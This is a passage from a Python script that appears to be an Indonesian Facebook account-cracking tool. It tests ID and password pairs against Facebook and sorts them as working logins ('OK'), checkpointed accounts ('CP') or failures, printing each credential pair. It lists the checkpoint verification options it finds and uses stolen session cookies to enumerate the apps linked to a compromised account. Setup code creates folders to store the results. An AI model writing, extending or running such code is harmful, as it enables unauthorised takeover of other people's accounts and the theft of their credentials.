					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s[SAW]--> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s[SAW]%s%s'%(kk,opsii.text,x))
				except:
					print('\r%s[SAW]%s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s[SAW]%s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s[SAW]%s|%s ----> ID       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# '
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
#----------------------[ CEK-APLIKASI ]---------------------#
def cek_apk(session,cookie):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n.")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n")
	else:
		for i in range(len(game)):
			print("   %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:os.system('touch SAW-IP.txt')
	except:pass
	try:os.system('touch SAW-IP.txt')
	except:pass
	login()